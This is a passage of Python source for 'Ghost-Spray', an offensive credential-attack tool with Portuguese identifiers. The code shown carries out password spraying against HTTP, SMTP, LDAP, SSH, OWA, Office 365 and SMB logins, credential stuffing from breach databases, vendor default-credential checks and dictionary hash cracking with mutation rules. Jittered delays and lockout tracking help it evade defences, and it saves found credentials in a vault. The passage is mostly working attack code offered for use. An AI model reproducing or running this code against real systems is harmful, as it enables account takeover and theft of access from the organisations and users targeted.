    lockout = LockoutDetector(limiar=5, janela_s=60, pausa_s=60)
    achados = []
    vault = CredVault(vault_senha) if vault_senha else None
    _lock = threading.Lock()
    total = len(usuarios) * len(senhas)
    tentativas = [0]

    def _tentar(usuario, senha):
        nonlocal tentativas
        if protocolo in ("http", "https"):
            ok, code = _testar_http_basic(alvo, usuario, senha, timeout=timeout)
        elif protocolo == "smtp":
            host, porta = (alvo.split(":") + ["587"])[:2]
            ok, code = _testar_smtp_auth(host, int(porta), usuario, senha, timeout=timeout)
        elif protocolo == "ldap":
            host, porta = (alvo.split(":") + ["389"])[:2]
            ok, code = _testar_ldap(host, int(porta), "", usuario, senha, timeout=timeout)
        elif protocolo == "ssh":
            host, porta = (alvo.split(":") + ["22"])[:2]
            ok, code = _testar_ssh(host, int(porta), usuario, senha, timeout=timeout)
        elif protocolo == "owa":
            host = alvo.replace("https://", "").replace("http://", "").split("/")[0]
            ok, code = _testar_owa(host, usuario, senha, timeout=timeout)
        elif protocolo == "o365":
            ok, code = _testar_o365(usuario, senha, timeout=timeout)
        elif protocolo == "smb":
            host, porta = (alvo.split(":") + ["445"])[:2]
            ok, code = _testar_smb(host, usuario, senha, porta=int(porta), timeout=timeout)
        else:
            ok, code = False, None

        with _lock:
            tentativas[0] += 1
            if ok:
                _log(f"CREDENCIAL VALIDA: {usuario}:{senha} [{protocolo}] [{code}]", "CRITICO")
                achados.append({"usuario": usuario, "senha": senha, "protocolo": protocolo,
                                 "alvo": alvo, "codigo": code})
                if vault:
                    vault.adicionar(usuario, senha, alvo, protocolo)
            elif verbose and code:
                _log(f"Falha: {usuario}:{senha} [{code}]", "INFO")

            if not ok:
                lockout.registrar_falha(usuario)

        if delay > 0:
            time.sleep(delay + random.uniform(0, delay * 0.3))

    # Spray: uma senha por vez para todos os usuarios
    for senha in senhas:
        _log(f"Testando senha: '{senha}' em {len(usuarios)} usuario(s)...", "INFO")
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futs = {ex.submit(_tentar, u, senha): u for u in usuarios}
            for fut in as_completed(futs):
                try:
                    fut.result()
                except Exception as e:
                    if verbose:
                        _log(f"Erro na thread: {e}", "ERRO")

    _log(f"Spray concluido: {tentativas[0]} tentativas | {len(achados)} credencial(is) encontrada(s)", "OK")
    return achados


# ──────────────────────────────────────────────────────────────────
# Credential Stuffing
# ──────────────────────────────────────────────────────────────────

def carregar_breach_db(caminho):
    """
    Carrega arquivo de breach DB em varios formatos:
    - user:password (formato comum)
    - email:password
    - password:email
    - JSON {\"email\":\"...\",\"password\":\"...\"}
    """
    pares = []
    try:
        with open(caminho, "r", encoding="utf-8", errors="ignore") as f:
            for linha in f:
                linha = linha.strip()
                if not linha or linha.startswith("#"):
                    continue
                # Tenta JSON
                if linha.startswith("{"):
                    try:
                        obj = json.loads(linha)
                        u = obj.get("email") or obj.get("username") or obj.get("user", "")
                        p = obj.get("password") or obj.get("pass", "")
                        if u and p:
                            pares.append((u, p))
                        continue
                    except Exception:
                        pass
                # Tenta separadores comuns
                for sep in (":", ";", "\t", "|"):
                    if sep in linha:
                        partes = linha.split(sep, 1)
                        if len(partes) == 2 and partes[0] and partes[1]:
                            pares.append((partes[0].strip(), partes[1].strip()))
                        break
    except Exception as e:
        _log(f"Erro ao ler breach DB: {e}", "ERRO")
    return pares


def credential_stuffing(alvo, breach_file, protocolo="http", timeout=5,
                         delay=1.0, threads=3, vault_senha=None, verbose=False):
    """Testa pares usuario:senha de uma breach database contra o alvo."""
    _secao(f"CREDENTIAL STUFFING - {protocolo.upper()} - {alvo}")
    pares = carregar_breach_db(breach_file)
    if not pares:
        _log(f"Nenhum par encontrado em {breach_file}", "ERRO")
        return []
    _log(f"Pares carregados: {len(pares)} de {breach_file}", "INFO")
    usuarios = [p[0] for p in pares]
    senhas_por_usuario = {p[0]: p[1] for p in pares}

    achados = []
    vault = CredVault(vault_senha) if vault_senha else None
    _lock = threading.Lock()

    def _tentar(usuario, senha):
        if protocolo in ("http", "https"):
            ok, code = _testar_http_basic(alvo, usuario, senha, timeout=timeout)
        elif protocolo == "smtp":
            host, porta = (alvo.split(":") + ["587"])[:2]
            ok, code = _testar_smtp_auth(host, int(porta), usuario, senha, timeout=timeout)
        else:
            ok, code = False, None

        if ok:
            with _lock:
                _log(f"STUFFING VALIDO: {usuario}:{senha} [{code}]", "CRITICO")
                achados.append({"usuario": usuario, "senha": senha, "protocolo": protocolo,
                                 "alvo": alvo, "codigo": code})
                if vault:
                    vault.adicionar(usuario, senha, alvo, protocolo, "stuffing")
        if delay > 0:
            time.sleep(delay + random.uniform(0, 0.5))

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_tentar, u, senhas_por_usuario[u]): u for u in usuarios}
        for fut in as_completed(futs):
            try:
                fut.result()
            except Exception as e:
                if verbose:
                    _log(f"Erro: {e}", "ERRO")

    _log(f"Stuffing concluido: {len(pares)} pares | {len(achados)} valido(s)", "OK")
    return achados


# ──────────────────────────────────────────────────────────────────
# Default Credentials Checker
# ──────────────────────────────────────────────────────────────────

def verificar_credenciais_padrao(alvo, protocolo="http", timeout=5):
    """Testa credenciais padrao conhecidas de fabricantes comuns."""
    _secao(f"DEFAULT CREDENTIALS - {protocolo.upper()} - {alvo}")
    achados = []

    for fabricante, usuario, senha in CREDENCIAIS_PADRAO:
        try:
            if protocolo in ("http", "https"):
                ok, code = _testar_http_basic(alvo, usuario, senha, timeout=timeout)
            elif protocolo == "smtp":
                host, porta = (alvo.split(":") + ["587"])[:2]
                ok, code = _testar_smtp_auth(host, int(porta), usuario, senha, timeout=timeout)
            elif protocolo == "ldap":
                host, porta = (alvo.split(":") + ["389"])[:2]
                ok, code = _testar_ldap(host, int(porta), "", usuario, senha, timeout=timeout)
            else:
                continue

            if ok:
                _log(f"CREDENCIAL PADRAO VALIDA [{fabricante}]: {usuario}:{senha} [{code}]", "CRITICO")
                achados.append({
                    "fabricante": fabricante, "usuario": usuario, "senha": senha,
                    "protocolo": protocolo, "alvo": alvo, "codigo": code
                })
        except Exception:
            pass
        time.sleep(0.1)

    if not achados:
        _log("Nenhuma credencial padrao funcionou", "INFO")
    return achados


# ──────────────────────────────────────────────────────────────────
# Hash Cracker (dicionario + regras)
# ──────────────────────────────────────────────────────────────────

HASH_TIPOS = {
    32: ("MD5",    lambda s: hashlib.md5(s).hexdigest()),
    40: ("SHA1",   lambda s: hashlib.sha1(s).hexdigest()),
    56: ("SHA224", lambda s: hashlib.sha224(s).hexdigest()),
    64: ("SHA256", lambda s: hashlib.sha256(s).hexdigest()),
    96: ("SHA384", lambda s: hashlib.sha384(s).hexdigest()),
    128:("SHA512", lambda s: hashlib.sha512(s).hexdigest()),
}

def _aplicar_regras(palavra):
    """Gera variantes de uma palavra via regras comuns."""
    variantes = [palavra]
    # Capitalizar primeira letra
    variantes.append(palavra.capitalize())
    # MAIUSCULA
    variantes.append(palavra.upper())
    # minuscula
    variantes.append(palavra.lower())
    # Adicionar numeros comuns
    for sufixo in ("1", "12", "123", "1234", "!", "@", "#", "2024", "2025"):
        variantes.append(palavra + sufixo)
        variantes.append(palavra.capitalize() + sufixo)
    # Substituicoes leet
    leet = palavra.lower().replace("a", "@").replace("e", "3").replace("i", "1").replace("o", "0")
    variantes.append(leet)
    variantes.append(leet.capitalize())
    return list(dict.fromkeys(variantes))  # deduplica mantendo ordem


def cracker_hash(hash_alvo, wordlist_file=None, verbose=False):
    """Quebra hash MD5/SHA1/SHA256 por dicionario + regras."""
    _secao(f"HASH CRACKER")
    hash_alvo = hash_alvo.strip().lower()
    tamanho = len(hash_alvo)
    if tamanho not in HASH_TIPOS:
        _log(f"Tamanho {tamanho} nao reconhecido. Tipos suportados: MD5(32), SHA1(40), SHA256(64), SHA512(128)", "ERRO")
        return None

    nome_tipo, fn_hash = HASH_TIPOS[tamanho]
    _log(f"Hash: {hash_alvo[:20]}... | Tipo: {nome_tipo}", "INFO")

    # Wordlist interna minima
    palavras_internas = SENHAS_COMUNS + [
        "abc123", "password", "iloveyou", "admin", "letmein", "monkey",
        "1234567890", "dragon", "master", "sunshine", "princess", "qwerty",
        "superman", "batman", "football", "baseball", "soccer", "hockey",
        "charlie", "donald", "shadow", "michael", "jessica", "thomas",
    ]

    palavras = []
    if wordlist_file:
        try:
            with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
                palavras = [l.strip() for l in f if l.strip()]
            _log(f"Wordlist: {len(palavras)} palavras de {wordlist_file}", "INFO")
        except Exception as e:
            _log(f"Erro ao ler wordlist: {e} - usando lista interna", "ALERTA")
            palavras = palavras_internas
    else:
        palavras = palavras_internas

    tentativas = 0
    for palavra in palavras:
        for variante in _aplicar_regras(palavra):
            tentativas += 1
            if fn_hash(variante.encode()) == hash_alvo:
                _log(f"HASH QUEBRADO: '{variante}' (tentativas: {tentativas})", "CRITICO")
                return variante
            if verbose and tentativas % 10000 == 0:
                _log(f"Tentativas: {tentativas}...", "INFO")

    _log(f"Hash nao quebrado em {tentativas} tentativas", "INFO")
    return None


# ──────────────────────────────────────────────────────────────────
# Vault CLI
# ──────────────────────────────────────────────────────────────────

def gerenciar_vault(acao, vault_senha):
    """Listar ou limpar entradas do vault."""
    vault = CredVault(vault_senha)
    if acao == "list":
        _secao("VAULT - CREDENCIAIS SALVAS")
        entradas = vault.carregar()
        if not entradas:
            _log("Vault vazio ou nao existe", "INFO")
            return
        for i, e in enumerate(entradas, 1):
            _log(f"{i:3}. [{e['protocolo']}] {e['alvo']} | {e['usuario']}:{e['senha']}", "ALERTA")
        _log(f"Total: {len(entradas)} entrada(s)", "OK")
    elif acao == "clear":
        vault.salvar([])
        _log("Vault limpo", "OK")
    elif acao == "export":
        entradas = vault.carregar()
        caminho = "vault_export.json"
        with open(caminho, "w") as f:
            json.dump(entradas, f, indent=2)
        _log(f"Vault exportado: {caminho}", "OK")


# ──────────────────────────────────────────────────────────────────
# CLI / main
# ──────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        prog="ghost-spray",
        description=f"Ghost-Spray v{VERSAO} - Password Spraying & Credential Attacks | By Gh0st-Bx1",
        formatter_class=argparse.RawTextHelpFormatter,
    )

    sub = parser.add_subparsers(dest="modo")

    # spray
    p_spray = sub.add_parser("spray", help="Password spraying (uma senha por vez, todos os usuarios)")
    p_spray.add_argument("-t", "--target", required=True, help="Alvo: URL ou host:porta")
    p_spray.add_argument("--protocol", choices=["http", "https", "smtp", "ldap", "ssh", "owa", "o365", "smb"],
                          default="http", help="Protocolo (padrao: http)")
    p_spray.add_argument("--userlist", required=True, help="Arquivo com lista de usuarios")
    p_spray.add_argument("--passlist", help="Arquivo com lista de senhas (padrao: lista interna)")
    p_spray.add_argument("--delay", type=float, default=1.0,
                          help="Delay em segundos entre tentativas (padrao: 1.0)")
    p_spray.add_argument("--threads", type=int, default=3,
                          help="Threads simultaneas por senha (padrao: 3)")
    p_spray.add_argument("--vault-pass", help="Senha do vault para salvar credenciais encontradas")
    p_spray.add_argument("--output", "-o", metavar="FILE", help="Salvar resultados em JSON")
    p_spray.add_argument("--verbose", action="store_true", help="Saida detalhada")

    # stuff (credential stuffing)
    p_stuff = sub.add_parser("stuff", help="Credential stuffing com breach database")
    p_stuff.add_argument("-t", "--target", required=True, help="Alvo: URL ou host:porta")
    p_stuff.add_argument("--breach-file", required=True,
                          help="Arquivo de breach DB (user:pass, email:pass ou JSON)")
    p_stuff.add_argument("--protocol", choices=["http", "https", "smtp"],
                          default="http", help="Protocolo (padrao: http)")
    p_stuff.add_argument("--delay", type=float, default=1.0, help="Delay entre tentativas")
    p_stuff.add_argument("--threads", type=int, default=3, help="Threads simultaneas")
    p_stuff.add_argument("--vault-pass", help="Senha do vault para salvar credenciais")
    p_stuff.add_argument("--output", "-o", metavar="FILE", help="Salvar resultados em JSON")
    p_stuff.add_argument("--verbose", action="store_true")

    # defaults
    p_def = sub.add_parser("defaults", help="Testar credenciais padrao de fabricantes")
    p_def.add_argument("-t", "--target", required=True, help="Alvo: URL ou host:porta")
    p_def.add_argument("--protocol", choices=["http", "https", "smtp", "ldap"],
                        default="http", help="Protocolo (padrao: http)")
    p_def.add_argument("--output", "-o", metavar="FILE", help="Salvar resultados em JSON")

    # hash
    p_hash = sub.add_parser("hash", help="Quebrar hash por dicionario + regras")
    p_hash.add_argument("--hash", required=True, help="Hash a quebrar (MD5/SHA1/SHA256/SHA512)")
    p_hash.add_argument("--wordlist", help="Arquivo wordlist (padrao: lista interna)")
    p_hash.add_argument("--verbose", action="store_true")

    # vault
    p_vault = sub.add_parser("vault", help="Gerenciar vault de credenciais")
    p_vault.add_argument("--action", choices=["list", "clear", "export"],
                          default="list", help="Acao no vault")
    p_vault.add_argument("--vault-pass", required=True, help="Senha mestre do vault")

    # kerbenum
    p_kerb = sub.add_parser("kerbenum", help="Enumeracao de usuarios via Kerberos AS-REQ")
    p_kerb.add_argument("--dc", required=True, help="IP ou hostname do Domain Controller")
    p_kerb.add_argument("--domain", required=True, help="Dominio AD (ex: corp.local)")
    p_kerb.add_argument("--userlist", required=True, help="Arquivo com lista de usuarios")

    # ntlm
    sub.add_parser("ntlm", help="Dicas e comandos para NTLM relay attacks")

    args = parser.parse_args()

    if not args.modo:
        print(BANNER)
        parser.print_help()
        sys.exit(0)

    print(BANNER)

    if args.modo == "spray":
        # Carregar usuarios
        try:
            with open(args.userlist, "r", encoding="utf-8", errors="ignore") as f:
                usuarios = [l.strip() for l in f if l.strip()]
        except Exception as e:
            _log(f"Erro ao ler userlist: {e}", "ERRO")
            sys.exit(1)

        # Carregar senhas
        if args.passlist:
            try:
                with open(args.passlist, "r", encoding="utf-8", errors="ignore") as f:
                    senhas = [l.strip() for l in f if l.strip()]
            except Exception as e:
                _log(f"Erro ao ler passlist: {e} - usando lista interna", "ALERTA")
                senhas = SENHAS_COMUNS
        else:
            senhas = SENHAS_COMUNS
            _log(f"Usando lista interna de {len(senhas)} senhas comuns", "INFO")

        achados = password_spray(
            args.target, usuarios, senhas,
            protocolo=args.protocol, delay=args.delay,
            threads=args.threads, vault_senha=args.vault_pass,
            verbose=args.verbose
        )

        if args.output and achados:
            with open(args.output, "w") as f:
                json.dump({"ferramenta": "ghost-spray", "modo": "spray",
                           "achados": achados}, f, indent=2)
            _log(f"Resultados salvos: {args.output}", "OK")

    elif args.modo == "stuff":
        achados = credential_stuffing(
            args.target, args.breach_file,
            protocolo=args.protocol, delay=args.delay,
            threads=args.threads, vault_senha=args.vault_pass,
            verbose=args.verbose
        )
        if args.output and achados:
            with open(args.output, "w") as f:
                json.dump({"ferramenta": "ghost-spray", "modo": "stuffing",
                           "achados": achados}, f, indent=2)
            _log(f"Resultados salvos: {args.output}", "OK")

    elif args.modo == "defaults":
        achados = verificar_credenciais_padrao(args.target, protocolo=args.protocol)
        if args.output and achados:
            with open(args.output, "w") as f:
                json.dump({"ferramenta": "ghost-spray", "modo": "defaults",
                           "achados": achados}, f, indent=2)
            _log(f"Resultados salvos: {args.output}", "OK")

    elif args.modo == "hash":
        resultado = cracker_hash(args.hash, wordlist_file=args.wordlist, verbose=args.verbose)
        if not resultado:
            _log("Hash nao quebrado com wordlist atual. Tente uma wordlist maior.", "ALERTA")

    elif args.modo == "vault":
        gerenciar_vault(args.action, args.vault_pass)

    elif args.modo == "kerbenum":
        try:
            with open(args.userlist, "r", encoding="utf-8", errors="ignore") as f:
                usuarios = [l.strip() for l in f if l.strip()]
        except Exception as e:
            _log(f"Erro ao ler userlist: {e}", "ERRO")
            sys.exit(1)
        kerberos_user_enum(args.dc, usuarios, args.domain)

    elif args.modo == "ntlm":
        mostrar_ntlm_relay_hints()

    print(f"\n  {C['G']}{C['N']}[+] Ghost-Spray finalizado.{C['X']}\n")


if __name__ == "__main__":
    main()
